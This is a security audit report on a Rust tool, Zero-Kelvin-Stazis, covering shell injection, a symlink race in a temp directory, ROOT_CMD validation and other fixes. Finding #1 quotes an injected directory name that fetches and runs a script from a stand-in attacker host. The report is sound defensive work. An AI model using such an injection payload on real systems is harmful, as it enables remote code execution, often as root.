# Security Audit Report: Zero-Kelvin-Stazis

Date: 2026-02-06

---

## #1. Shell Injection in `generate_freeze_script` [CRITICAL] -- FIXED

**File:** `src/engine.rs` (function `generate_freeze_script`)

**Problem:**
Paths were interpolated into a shell script using double quotes:
```rust
script.push_str(&format!("mount --bind \"{}\" \"{}\"\n", src.display(), dest.display()));
```
Double quotes in POSIX shell do NOT protect against `$()`, backticks, or `\`.
A directory named `test$(curl attacker.com/shell.sh|sh)` would execute arbitrary
commands when `freeze.sh` runs -- often as root (with `-e` flag).

**Fix:**
Added `shell_quote()` helper that wraps paths in single quotes with proper `'` escaping
(`'` -> `'\''`). Single quotes prevent ALL shell interpretation:
```rust
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}
```
All path interpolations in `generate_freeze_script` now use `shell_quote()`.

**Tests added:**
- `test_shell_quote` -- unit test for the escaping function
- `test_generate_freeze_script_injection_safe` -- verifies dangerous chars (`$()`, backticks, `$VAR`) are neutralized

---

## #2. TOCTOU Race in `/tmp/stazis-<uid>` [HIGH] -- FIXED

**File:** `src/utils.rs` (function `get_stazis_temp_dir`)

**Problem:**
```rust
if !path.exists() {
    fs::create_dir_all(&path)?;   // TOCTOU gap: attacker creates symlink here
}
fs::set_permissions(&path, ...)?; // Now operates on attacker's target
```
Between `exists()` and `create_dir_all()`, an attacker could replace the path with a
symlink (e.g., `/tmp/stazis-1000` -> `/etc`), causing staging files to be written to
an attacker-controlled location. `create_dir_all` follows symlinks.

**Fix:**
- Use `fs::create_dir` (atomic, fails on existing) instead of `create_dir_all`
- On `AlreadyExists`: verify with `symlink_metadata` (doesn't follow symlinks) that:
  1. It's a real directory (not a symlink)
  2. It's owned by the current UID
  3. Has correct permissions (0700)
- Reject with a security error if any check fails

---

## #3. `ROOT_CMD` from Environment Variable [MEDIUM] -- FIXED

**File:** `src/bin/squash_manager-rs.rs` (function `get_effective_root_cmd`), `src/constants.rs`

**Problem:**
`ROOT_CMD` env var was accepted without validation, allowing arbitrary binary execution.

**Fix:**
- Added compiled-in whitelist `ALLOWED_ROOT_CMDS` in `src/constants.rs`:
  `["sudo", "doas", "sudo-rs", "run0", "pkexec", "please"]`
- `get_effective_root_cmd()` now validates `ROOT_CMD` against the whitelist before accepting.
  Non-whitelisted values trigger `eprintln` warning and are ignored.
- Optional user config `~/.config/stazis/allowed_root_cmds.yaml` (YAML, not auto-created):
  - Must be owned by current UID with permissions 0600 (security validation)
  - Can override whitelist and set preferred default command
  - Each entry validated: only `[a-zA-Z0-9_-]` characters allowed
- Auto-detection order: config `default` → `which` over whitelist → fallback `sudo`

---

## #4. Signal Handler Safety [LOW] -- DEFERRED

**File:** `src/bin/squash_manager-rs.rs` (function `cleanup_on_interrupt`)

**Problem:**
The `ctrlc` handler calls `Mutex::lock`, `process::Command::new`, and `fs::remove_file`,
none of which are async-signal-safe. Could theoretically deadlock if signal arrives during
a Mutex operation.

**Status:** Deferred. In practice this rarely causes issues on Linux. A proper fix would
require a flag-based approach (set atomic bool in handler, check in main loop), which is
a significant refactor.

---

## #5. Predictable Mapper Name Collision [LOW] -- FIXED

**File:** `src/bin/squash_manager-rs.rs` (function `generate_mapper_name`)

**Problem:**
Mapper names were derived solely from the image filename: `sq_<sanitized_basename>`.
Two different images with identical filenames (but different paths) would produce
the same mapper name, causing mount collisions.

**Fix:**
`generate_mapper_name` now checks `/dev/mapper/` for existing names before returning:
1. Try base name `sq_<basename>`
2. If collision: try `sq_<basename>_2` through `sq_<basename>_99`
3. Fallback: `sq_<basename>_<timestamp>_<random>` (guaranteed unique)

This preserves human-readable names while preventing collisions.

Additionally, the Create LUKS branch (previously using inline `sq_<timestamp>_<random>`)
now also calls `generate_mapper_name()` for consistent collision-safe behavior.

---

## #6. Code Duplication in `check_read_permissions` / `ensure_read_permissions` [CODE QUALITY] -- FIXED

**File:** `src/utils.rs`

**Problem:**
Two nearly identical functions (~20 lines each). In `ensure_read_permissions`, the
`PermissionDenied` branch returned the same `Err(ZksError::IoError(e))` as the generic
branch, making the conditional check redundant.

**Fix:**
`ensure_read_permissions` now delegates to `check_read_permissions`:
```rust
pub fn ensure_read_permissions(paths: &[PathBuf]) -> Result<(), ZksError> {
    if !check_read_permissions(paths)? {
        return Err(ZksError::OperationFailed(
            "Insufficient read permissions for one or more freeze targets".to_string(),
        ));
    }
    Ok(())
}
```
Eliminates ~15 lines of duplicated logic.
